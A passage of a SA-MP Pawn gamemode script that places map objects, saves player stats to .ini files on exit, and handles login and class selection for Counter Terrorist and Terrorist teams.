CreateObject(3887,-295.5234375,2721.3493652,70.1912308,0.0000000,0.0000000,0.0000000); //object(demolish4_sfxrf) (1)
CreateObject(982,-145.7474365,2634.1281738,63.4028816,0.0000000,0.0000000,0.0000000); //object(fenceshit) (1)
CreateObject(982,-151.5318604,2634.6474609,63.3235054,0.0000000,0.0000000,0.0000000); //object(fenceshit) (2)
CreateObject(982,-157.7966309,2634.2082520,63.2653732,0.0000000,0.0000000,0.0000000); //object(fenceshit) (3)
CreateObject(982,-164.3557739,2634.4025879,63.2045059,0.0000000,0.0000000,0.0000000); //object(fenceshit) (4)
CreateObject(3418,-204.3144379,2604.3149414,63.8713341,0.0000000,0.0000000,89.7300110); //object(ce_oldhut02) (1)
CreateObject(10984,-211.2384796,2607.2221680,62.2866821,0.0000000,0.0000000,149.5500793); //object(rubbled01_sfs) (1)
CreateObject(10984,-196.1525726,2610.1494141,61.5366821,0.0000000,0.0000000,149.5458984); //object(rubbled01_sfs) (2)
CreateObject(10984,-198.3910370,2601.9560547,61.5366821,0.0000000,0.0000000,334.9605713); //object(rubbled01_sfs) (3)
CreateObject(10986,-202.8905334,2614.0107422,61.9826202,0.0000000,0.0000000,129.6100464); //object(rubbled03_sfs) (1)
CreateObject(10984,-206.5339050,2604.1520996,62.0366821,0.0000000,0.0000000,149.5458984); //object(rubbled01_sfs) (4)
CreateObject(1304,-237.6017303,2607.6921387,62.6307564,0.0000000,0.0000000,0.0000000); //object(dyn_quarryrock02) (1)
CreateObject(1225,-214.0479431,2715.4013672,62.0932541,0.0000000,0.0000000,0.0000000); //object(barrel4) (1)
CreateObject(1676,-289.7134399,2647.3657227,63.7297478,0.0000000,0.0000000,0.0000000); //object(washgaspump) (1)
CreateObject(2780,-289.9107666,2646.5917969,62.1762772,0.0000000,0.0000000,0.0000000); //object(cj_smoke_mach) (1)
CreateObject(3877,-173.4338989,2658.4814453,66.3493576,0.0000000,0.0000000,0.0000000); //object(sf_rooflite) (1)
CreateObject(7073,-141.8154602,2636.8247070,91.6979218,0.0000000,0.0000000,0.0000000); //object(vegascowboy1) (1)
CreateObject(980,-141.6923370,2636.6154785,65.5312881,0.0000000,0.0000000,268.2402344); //object(airportgate) (1)
//----Snipe-Map
CreateDynamicObject(4019, 1761.36, -1773.97, 350.00,   0.00, 0.00, 0.00);
CreateDynamicObject(4019, 1862.72, -1773.97, 350.00,   0.00, 0.00, 0.00);
CreateDynamicObject(3095, 1789.67, -1803.19, 388.63,   0.00, 0.00, 0.00);
CreateDynamicObject(3277, 1789.18, -1803.21, 389.83,   0.00, 0.00, 0.00);
CreateDynamicObject(3884, 1788.85, -1802.94, 389.82,   0.00, 0.00, -90.00);
CreateDynamicObject(3095, 1789.67, -1746.48, 388.63,   0.00, 0.00, 0.00);
CreateDynamicObject(3277, 1789.18, -1746.27, 389.83,   0.00, 0.00, 0.00);
CreateDynamicObject(3884, 1788.85, -1746.41, 389.82,   0.00, 0.00, -90.00);
CreateDynamicObject(3095, 1834.96, -1746.48, 388.63,   0.00, 0.00, 0.00);
CreateDynamicObject(3095, 1834.88, -1803.19, 388.63,   0.00, 0.00, 0.00);
CreateDynamicObject(3277, 1834.72, -1803.21, 389.83,   0.00, 0.00, 0.00);
CreateDynamicObject(3884, 1834.79, -1802.94, 389.82,   0.00, 0.00, -90.00);
CreateDynamicObject(3277, 1834.76, -1746.27, 389.83,   0.00, 0.00, 0.00);
CreateDynamicObject(3884, 1834.79, -1746.41, 389.82,   0.00, 0.00, -90.00);
CreateDynamicObject(3279, 1833.41, -1775.27, 388.91,   0.00, 0.00, 0.00);
CreateDynamicObject(3279, 1862.69, -1775.27, 388.91,   0.00, 0.00, 0.00);
CreateDynamicObject(3279, 1892.22, -1745.78, 388.91,   0.00, 0.00, -90.00);
CreateDynamicObject(3279, 1890.34, -1803.50, 388.91,   0.00, 0.00, 90.00);
CreateDynamicObject(3279, 1790.48, -1775.27, 388.91,   0.00, 0.00, 180.00);
CreateDynamicObject(3279, 1761.87, -1775.27, 388.91,   0.00, 0.00, 180.00);
CreateDynamicObject(3279, 1731.60, -1803.50, 388.91,   0.00, 0.00, 90.00);
CreateDynamicObject(3279, 1733.65, -1745.78, 388.91,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1796.17, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1792.24, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1788.28, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1784.32, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1780.29, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1768.59, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1764.74, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1760.87, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1757.02, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1788.54, -1753.12, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(14411, 1835.32, -1753.24, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1757.25, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1761.17, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1765.01, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1768.82, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1770.78, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1781.95, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1785.92, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1789.63, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1793.50, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1835.32, -1796.82, 386.94,   0.00, 0.00, 90.00);
CreateDynamicObject(14411, 1788.54, -1797.23, 386.94,   0.00, 0.00, -90.00);
CreateDynamicObject(922, 1794.16, -1753.41, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1757.96, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1762.37, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1766.76, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1780.98, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1785.29, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1789.70, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1794.08, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1798.51, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1803.09, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1749.01, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1744.66, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1794.18, -1807.25, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1796.62, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1792.24, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1800.97, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1788.00, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1783.60, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1770.36, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1766.08, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1761.79, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1757.30, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1752.89, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1748.58, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1744.09, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(922, 1829.72, -1805.40, 391.25,   0.00, 0.00, 90.00);
CreateDynamicObject(3378, 1859.73, -1752.67, 388.93,   0.00, 0.00, 0.00);
CreateDynamicObject(3378, 1859.73, -1796.59, 388.93,   0.00, 0.00, 0.00);
CreateDynamicObject(3378, 1764.85, -1752.76, 388.93,   0.00, 0.00, 0.00);
CreateDynamicObject(3378, 1764.85, -1797.10, 388.93,   0.00, 0.00, 0.00);
CreateDynamicObject(2973, 1760.72, -1787.17, 388.93,   0.00, 0.00, 0.00);
CreateDynamicObject(2973, 1760.80, -1762.82, 388.93,   0.00, 0.00, 0.00);
CreateDynamicObject(2973, 1863.77, -1762.67, 388.94,   0.00, 0.00, 0.00);
CreateDynamicObject(2973, 1863.67, -1786.59, 388.94,   0.00, 0.00, 0.00);
CreateDynamicObject(2669, 1875.98, -1745.08, 390.17,   0.00, 0.00, 0.00);
CreateDynamicObject(2669, 1875.98, -1805.29, 390.17,   0.00, 0.00, 180.00);
CreateDynamicObject(2669, 1748.61, -1805.40, 390.17,   0.00, 0.00, 180.08);
CreateDynamicObject(2669, 1748.61, -1745.04, 390.17,   0.00, 0.00, 0.00);
CreateDynamicObject(3575, 1742.64, -1776.11, 391.58,   0.00, 0.00, 0.00);
CreateDynamicObject(3575, 1879.80, -1776.08, 391.58,   0.00, 0.00, 0.00);
CreateDynamicObject(5262, 1742.08, -1796.51, 391.43,   0.00, 0.00, 0.00);
CreateDynamicObject(5262, 1742.08, -1759.84, 391.43,   0.00, 0.00, 0.00);
CreateDynamicObject(5262, 1882.62, -1793.89, 391.43,   0.00, 0.00, 180.00);
CreateDynamicObject(5262, 1882.62, -1755.17, 391.43,   0.00, 0.00, 180.00);
CreateDynamicObject(18257, 1784.53, -1790.64, 388.92,   0.00, 0.00, 90.00);
CreateDynamicObject(18257, 1840.18, -1758.97, 388.92,   0.00, 0.00, -90.00);
//snipermap(by erfan)
CreateObject(10627, 261.13559, 420.91107, 5.97235,   0.00000, 0.00000, 0.00000);
CreateObject(8401, 347.62610, 404.97043, 0.60216,   0.00000, 0.00000, -40.92000);
CreateObject(8354, 282.94958, 395.18173, 0.11148,   0.00000, 0.00000, -3.42000);
CreateObject(8171, 378.86252, 301.17188, 0.22729,   0.00000, 0.00000, -92.75999);
CreateObject(8498, 338.46289, 314.45984, -19.61851,   0.00000, 0.00000, 66.30002);
CreateObject(14877, 370.56171, 357.08353, 13.97886,   0.00000, 0.00000, 87.30001);
CreateObject(14877, 375.00974, 302.17847, 13.97886,   0.00000, 0.00000, -93.48003);
CreateObject(14877, 349.27188, 269.53003, 13.97886,   0.00000, 0.00000, 0.17997);
CreateObject(6103, 195.39993, 321.35010, 0.19638,   0.00000, 0.00000, -3.00000);
CreateObject(8171, 240.92882, 308.20425, 0.22729,   0.00000, 0.00000, -93.29999);
CreateObject(14877, 320.73001, 410.79575, 1.65736,   0.00000, 0.00000, -42.90006);
CreateObject(14877, 336.15359, 429.32993, 1.65736,   0.00000, 0.00000, -40.08005);
CreateObject(16302, 354.86725, 408.95218, 9.10850,   0.00000, 0.00000, -17.58000);
CreateObject(16302, 345.75525, 394.48764, 5.04747,   0.00000, 0.00000, -17.58000);
CreateObject(16134, 297.24438, 463.48300, -3.49136,   0.00000, 0.00000, 0.00000);
CreateObject(16305, 276.31711, 366.85849, 4.55986,   0.00000, 0.00000, 0.00000);
CreateObject(16302, 349.63202, 305.22687, 6.02874,   0.00000, 0.00000, 0.00000);
CreateObject(16302, 256.50037, 301.07819, 6.02874,   0.00000, 0.00000, 0.00000);
CreateObject(14877, 328.36014, 289.15207, 1.93362,   0.00000, 0.00000, -92.10002);
CreateObject(14877, 322.39996, 286.05878, 5.80717,   0.00000, 0.00000, -181.49994);
CreateObject(2060, 259.30057, 326.81015, 3.31789,   0.00000, 0.00000, -2.10000);
CreateObject(2060, 258.23590, 326.84875, 3.31789,   0.00000, 0.00000, -2.10000);
CreateObject(2060, 257.29459, 326.88187, 3.31789,   0.00000, 0.00000, -2.10000);
CreateObject(2060, 259.65222, 327.55283, 3.31789,   0.00000, 0.00000, -92.27995);
CreateObject(2060, 259.70663, 328.67154, 3.31789,   0.00000, 0.00000, -92.27995);
CreateObject(2060, 259.73721, 329.71130, 3.31789,   0.00000, 0.00000, -92.27995);
CreateObject(2060, 259.73721, 329.71130, 3.45773,   0.00000, 0.00000, -92.27995);
CreateObject(2060, 259.68173, 328.57266, 3.45773,   0.00000, 0.00000, -92.27995);
CreateObject(2060, 259.62823, 327.47400, 3.45773,   0.00000, 0.00000, -92.27995);
CreateObject(2060, 258.27386, 326.79910, 3.45773,   0.00000, 0.00000, -181.37987);
CreateObject(2060, 257.28448, 326.82370, 3.45773,   0.00000, 0.00000, -181.37987);
CreateObject(2060, 257.28448, 326.82370, 3.60373,   0.00000, 0.00000, -181.37987);
CreateObject(2060, 258.41800, 326.77615, 3.60373,   0.00000, 0.00000, -181.37987);
CreateObject(2060, 259.68408, 327.42627, 3.60373,   0.00000, 0.00000, -271.38013);
CreateObject(2060, 259.76044, 328.48526, 3.60373,   0.00000, 0.00000, -271.38013);
CreateObject(2060, 259.80994, 329.64859, 3.60373,   0.00000, 0.00000, -271.38013);
CreateObject(2060, 259.76816, 328.54483, 3.72274,   0.00000, 0.00000, -271.38013);
CreateObject(2060, 259.79269, 329.67105, 3.72274,   0.00000, 0.00000, -271.38013);
CreateObject(2060, 259.68668, 327.44614, 3.74257,   0.00000, 0.00000, -271.38013);
CreateObject(2060, 257.27475, 326.75269, 3.74257,   0.00000, 0.00000, -359.45987);
CreateObject(2060, 258.38998, 326.79230, 3.74257,   0.00000, 0.00000, -359.45987);
CreateObject(18637, 347.32870, 374.18600, 6.62467,   92.81992, 51.59999, 0.00000);
CreateObject(18637, 347.61850, 374.57071, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(18637, 347.93317, 374.93542, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(18637, 348.23218, 375.31302, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(18637, 348.53113, 375.69052, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(18637, 348.83017, 376.06812, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(18637, 349.15738, 376.44650, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(18637, 349.45645, 376.82407, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(18637, 349.76910, 377.21622, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(18637, 350.06805, 377.59369, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(18637, 350.36700, 377.97122, 6.62467,   92.81992, 51.59999, -0.96000);
CreateObject(19307, 258.99591, 326.77872, 3.35096,   0.00000, 0.00000, -62.22000);
CreateObject(3525, 256.62354, 301.59698, 11.38752,   0.00000, 0.00000, 0.00000);
CreateObject(3525, 349.85416, 305.73212, 11.36103,   0.00000, 0.00000, 0.00000);
CreateObject(1222, 269.21381, 437.24744, 18.86786,   0.00000, 0.00000, 0.00000);
CreateObject(1222, 269.11230, 438.26190, 18.86786,   0.00000, 0.00000, 0.00000);
CreateObject(1222, 268.45422, 439.03070, 18.86786,   0.00000, 0.00000, 0.00000);
CreateObject(1222, 268.43542, 436.21011, 18.86786,   0.00000, 0.00000, 0.00000);
CreateObject(1222, 267.49948, 435.44226, 18.86786,   0.00000, 0.00000, 0.00000);
CreateObject(3524, 269.18607, 437.24713, 17.53331,   0.00000, 0.00000, -97.92003);
CreateObject(3524, 269.05472, 438.21332, 17.53331,   0.00000, 0.00000, -85.98003);
CreateObject(3524, 268.33734, 438.98923, 17.53331,   0.00000, 0.00000, -35.40001);
CreateObject(3524, 268.31860, 436.24408, 17.53331,   0.00000, 0.00000, -139.55992);
CreateObject(3524, 267.51831, 435.45062, 17.53331,   0.00000, 0.00000, -152.03987);
CreateObject(3525, 276.38333, 367.36758, 4.15288,   0.00000, 0.00000, 0.00000);
CreateObject(2060, 238.56470, 327.97910, 5.38686,   0.00000, 0.00000, 0.00000);
CreateObject(2060, 237.56587, 327.99933, 5.38686,   0.00000, 0.00000, -0.30000);
CreateObject(2060, 236.48418, 328.02570, 5.38686,   0.00000, 0.00000, 0.00000);
CreateObject(2060, 238.88246, 328.85300, 5.38686,   0.00000, 0.00000, -93.12001);
CreateObject(2060, 238.93532, 329.79190, 5.38686,   0.00000, 0.00000, -93.12001);
CreateObject(2060, 238.98695, 330.67072, 5.38686,   0.00000, 0.00000, -93.12001);
CreateObject(2060, 238.98695, 330.67072, 5.62063,   0.00000, 0.00000, -93.12001);
CreateObject(2060, 239.00749, 329.73712, 5.64040,   0.00000, 0.00000, -93.12001);
CreateObject(2060, 238.95811, 328.77573, 5.62063,   0.00000, 0.00000, -93.12001);
CreateObject(2060, 237.49580, 328.01553, 5.62063,   0.00000, 0.00000, -178.31989);
CreateObject(2060, 236.48984, 328.05023, 5.62063,   0.00000, 0.00000, -178.31989);
CreateObject(2060, 236.43324, 328.11343, 5.82958,   0.00000, 0.00000, -178.31989);
CreateObject(2060, 237.47530, 328.06787, 5.82958,   0.00000, 0.00000, -178.31989);
CreateObject(2060, 239.05598, 328.74969, 5.82958,   0.00000, 0.00000, -274.85974);
CreateObject(2060, 239.09998, 329.71414, 5.82958,   0.00000, 0.00000, -274.85974);
CreateObject(2060, 239.13704, 330.73749, 5.82958,   0.00000, 0.00000, -274.85974);
CreateObject(2060, 235.50233, 328.14609, 5.82958,   0.00000, 0.00000, -178.31989);
CreateObject(2060, 235.44640, 328.03650, 5.62063,   0.00000, 0.00000, -178.31989);
CreateObject(2060, 235.39970, 328.00919, 5.38686,   0.00000, 0.00000, 0.00000);
CreateObject(19306, 238.33644, 328.02856, 5.43137,   0.00000, 0.00000, -80.15999);
CreateObject(2780, 336.23355, 304.09387, 0.10441,   0.00000, 0.00000, -104.87998);
CreateObject(2780, 317.41669, 399.58698, 0.10813,   0.00000, 0.00000, -100.73999);
CreateObject(2780, 266.18115, 395.27075, 13.09945,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 266.27521, 417.53986, 12.57990,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 267.36703, 426.34738, 12.86030,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 376.85934, 338.70935, 11.29551,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 279.73358, 370.35028, 2.33433,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 274.25531, 360.50833, 1.85774,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 261.03775, 303.04596, 6.37584,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 358.31064, 269.79764, 17.66126,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 283.98892, 361.44769, 0.75080,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 337.14752, 419.72510, 2.13506,   0.00000, 0.00000, 0.00000);
CreateObject(6865, 266.76706, 404.32001, 8.62304,   0.00000, 0.00000, 133.01999);
CreateObject(6865, 267.27121, 413.53540, 8.62304,   0.00000, 0.00000, 133.01999);
CreateObject(6865, 267.62772, 422.38748, 8.62304,   0.00000, 0.00000, 133.01999);
CreateObject(3877, 348.52341, 282.90909, 13.68456,   0.00000, 0.00000, 0.00000);
CreateObject(3877, 336.56729, 283.35468, 13.68456,   0.00000, 0.00000, 0.00000);
CreateObject(3877, 325.25714, 284.02744, 13.68456,   0.00000, 0.00000, 0.00000);
CreateObject(3877, 314.64856, 284.48926, 13.68456,   0.00000, 0.00000, 0.00000);
CreateObject(3877, 303.57852, 285.03470, 13.68456,   0.00000, 0.00000, 0.00000);
CreateObject(3877, 292.90640, 285.73004, 13.68456,   0.00000, 0.00000, 0.00000);
CreateObject(3877, 282.58725, 286.19885, 13.68456,   0.00000, 0.00000, 0.00000);
CreateObject(3534, 365.99619, 354.77298, 13.27306,   0.00000, 0.00000, 0.00000);
CreateObject(3534, 365.61029, 347.02243, 13.27306,   0.00000, 0.00000, 0.00000);
CreateObject(3534, 365.25418, 339.48859, 13.27306,   0.00000, 0.00000, 0.00000);
CreateObject(3534, 364.81680, 331.65973, 13.27306,   0.00000, 0.00000, 0.00000);
CreateObject(3534, 364.52505, 324.18146, 13.27306,   0.00000, 0.00000, 0.00000);
CreateObject(3534, 364.00406, 315.17590, 13.27306,   0.00000, 0.00000, 0.00000);
CreateObject(3534, 366.80164, 304.89212, 13.27306,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 343.86990, 408.78641, 4.26393,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 360.71628, 413.17084, 8.60576,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 341.65836, 390.58322, 5.26064,   0.00000, 0.00000, 0.00000);
CreateObject(833, 316.20721, 315.41495, 0.91230,   0.00000, 0.00000, 0.00000);
CreateObject(833, 316.82993, 312.44525, 0.91230,   0.00000, 0.00000, -88.25999);
CreateObject(836, 282.24448, 301.55701, 1.27286,   0.00000, 0.00000, 0.00000);
CreateObject(3399, 264.13571, 387.04712, 2.52455,   0.00000, 0.00000, 85.91996);
CreateObject(3399, 269.78207, 392.01642, 6.80265,   0.00000, 0.00000, -10.68003);
CreateObject(3399, 276.50076, 396.34140, 11.38832,   0.00000, 0.00000, 78.65996);
CreateObject(3399, 272.33310, 402.88226, 15.95220,   0.00000, 0.00000, 170.03984);
  CreateDynamicObject(3749, -115.49808, 1221.52856, 22.81036, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(8147, -239.69099, 1118.71826, 19.08656, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(8147, -58.82002, 1117.68127, 21.80660, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(8151, -98.62497, 1020.54614, 23.27034, 0.00000, 0.00000, 270.04901);
    CreateDynamicObject(8147, -195.39198, 1207.14758, 18.68986, 0.00000, 0.00000, 90.25670);
    CreateDynamicObject(8210, -238.68028, 1018.18359, 19.04877, 0.00000, 0.00000, 92.03837);
    CreateDynamicObject(8210, -157.37282, 990.01721, 21.88205, 0.00000, 0.00000, 358.26193);
    CreateDynamicObject(987, -237.49779, 990.49396, 18.63319, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, -122.25216, 1207.67639, 18.23034, 0.00000, 0.00000, 92.27201);
    CreateDynamicObject(987, -106.65011, 1208.03711, 18.06171, 0.00000, 0.00000, 89.87713);
    CreateDynamicObject(987, -106.70264, 1207.89514, 18.11473, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, -94.84398, 1207.89417, 18.05103, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, -82.88767, 1207.91296, 18.01891, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, -71.50135, 1207.79675, 18.01891, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(3749, -57.84321, 1198.20142, 23.58762, 0.00000, 0.00000, 269.42871);
    CreateDynamicObject(987, -225.64581, 990.32538, 18.63319, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, -213.67477, 990.26666, 18.63319, 0.00000, 0.00000, 1.02124);
    CreateDynamicObject(3749, -194.44261, 988.77728, 23.60556, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, -262.98004, 1192.25977, 18.70125, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, -251.03413, 1191.91943, 18.49216, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(3749, -266.83029, 1199.43567, 23.69621, 0.00000, 0.00000, 268.72186);
    CreateDynamicObject(987, -268.93488, 1192.29932, 18.70125, 0.00000, 0.00000, 0.00000);
    CreateDynamicObject(3268, -215.29166, 1141.03760, 18.65550, 0.00000, 0.00000, 180.00000);
    CreateDynamicObject(3627, -140.49799, 1079.30054, 21.17660, 0.00000, 0.00000, 90.00000);
    CreateDynamicObject(18850, -93.80170, 1028.66577, 6.65587, 0.00000, 0.00000, 90.00000);
    CreateDynamicObject(18850, -167.04668, 1172.39758, 6.52489, 0.00000, 0.00000, 90.00000);
    CreateDynamicObject(18850, -133.22948, 1028.29553, 6.65587, 0.00000, 0.00000, 90.00000);
    CreateDynamicObject(18850, -139.09833, 1172.31616, 6.52489, 0.00000, 0.00000, 90.00000);
    CreateDynamicObject(16409, -212.91335, 1075.97852, 18.72559, 0.00000, 0.00000, -180.00000);
    CreateDynamicObject(16409, -213.08398, 1038.37659, 18.72559, 0.00000, 0.00000, -180.00000);
    CreateDynamicObject(16409, -213.04738, 1057.27795, 18.72559, 0.00000, 0.00000, -180.00000);
    CreateDynamicObject(3268, -215.18987, 1173.29944, 18.53776, 0.00000, 0.00000, 180.00000);
    CreateDynamicObject(3359, -210.06464, 1115.84937, 18.57216, 0.00000, 0.00000, 90.00000);

printf("Hale");


return 1;
}

public OnGameModeExit()
{
for(new r= 0;r<=MAX_PLAYERS;r++)
{
if(IsPlayerConnected(r))
{
    	new cname[MAX_PLAYER_NAME], path[200];
GetPlayerName(r, cname, sizeof(cname));
format(path, sizeof(path), "/spieler/%s.ini", cname);

dini_IntSet(path, "Cash",GetPlayerMoney(r));
dini_IntSet(path, "Admin",PlayerInfo[r][pAdmin]);
dini_IntSet(path, "Kills",PlayerInfo[r][pKills]);
dini_IntSet(path, "Deaths",PlayerInfo[r][pDeaths]);
dini_IntSet(path, "Vip",PlayerInfo[r][pVip]);
dini_IntSet(path, "Score",PlayerInfo[r][pScore]);
dini_IntSet(path, "Tala",PlayerInfo[r][pTala]);
dini_IntSet(path, "Clan",PlayerInfo[r][pClan]);
dini_IntSet(path, "Rank",PlayerInfo[r][pRank]);
PlayerInfo[r][pLog] = 0;
}
}
	return 1;
}
LoopingAnim(playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
    ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
}
public OnPlayerRequestClass(playerid, classid)
{
    TextDrawHideForPlayer(playerid, bg);
    bedamjetpack[playerid] = false;
    if(reg[playerid] == 0) return 1;
    TogglePlayerSpectating(playerid, 0);
	if(PlayerInfo[playerid][pLog] == 0) { ShowPlayerDialog(playerid, DIALOG_LOGIN1, DIALOG_STYLE_INPUT, "Login", "Your Password", "OK", "Cancel"); return 1;}
	gteam[playerid] = 0;
 	 TextDrawShowForPlayer(playerid, Textdrawt);
TextDrawShowForPlayer(playerid, Amar1);
    TextDrawShowForPlayer(playerid, Amar2);
    TextDrawShowForPlayer(playerid, Amar3);//tdrw1
    TextDrawHideForPlayer(playerid, Don);
    TextDrawHideForPlayer(playerid, tdrw0);
    TextDrawHideForPlayer(playerid, tdrw1);
    TextDrawHideForPlayer(playerid, tdrw2);
TextDrawHideForPlayer(playerid, Textdrawa);
    TextDrawHideForPlayer(playerid, Textdrawb);
    TextDrawHideForPlayer(playerid, Textdrawc);
    TextDrawHideForPlayer(playerid, Textdrawd);
    TextDrawHideForPlayer(playerid, Textdrawe);
    TextDrawHideForPlayer(playerid, Textdraw5);
    TextDrawHideForPlayer(playerid, Textdraw6);
    TextDrawHideForPlayer(playerid, Textdraw7);
    TextDrawHideForPlayer(playerid, Textdraw8);
    TextDrawHideForPlayer(playerid, Textdraw9);
    TextDrawHideForPlayer(playerid, Textdraw10);
    TextDrawHideForPlayer(playerid, bg);
    TextDrawHideForPlayer(playerid, Textdraw12);
    TextDrawHideForPlayer(playerid, Textdraw13);
    TextDrawHideForPlayer(playerid, Textdraw14);
    TextDrawHideForPlayer(playerid, Textdraw15);
    TextDrawHideForPlayer(playerid, Textdraw16);
    TextDrawHideForPlayer(playerid, Textdraw17);
    TextDrawHideForPlayer(playerid, Textdraw18);
    TextDrawHideForPlayer(playerid, Textdraw19);
    TextDrawHideForPlayer(playerid, Textdraw20);
    TextDrawHideForPlayer(playerid, Textdraw21);
    TextDrawHideForPlayer(playerid, Textdraw22);

SetPlayerPosEx(playerid, -2231.992675, -1738.325439, 480.938598, 40.234375,0,0);
SetPlayerFacingAngle(playerid, 40.234375);
SetPlayerCameraLookAt(playerid, -2231.992675, -1738.325439, 480.938598);
SetPlayerCameraPos(playerid, -2231.992675 + (5 * floatsin(-40.234375, degrees)), -1738.325439 + (5 * floatcos(-40.234375, degrees)), 480.938598);
	if(MapChange == 0)
{
        if(classid == 0)
    {
        SetPlayerSkin(playerid,20034);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Counter Terrorist",900,4);
        gteam[playerid] = 1;
    }
   else if(classid == 1)
    {
        SetPlayerSkin(playerid,20033);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
          GameTextForPlayer(playerid,"~b~Counter Terrorist",900,4);
          gteam[playerid] = 1;
    }
     else if(classid == 2)
    {
        SetPlayerSkin(playerid,20035);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
          GameTextForPlayer(playerid,"~r~Terrorist",900,4);
          gteam[playerid] = 2;
    }
     else if(classid == 3)
    {
        SetPlayerSkin(playerid,20036);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
          GameTextForPlayer(playerid,"~r~Terrorist",900,4);
          gteam[playerid] = 2;
    } 
    
}
else 	if(MapChange == 1)
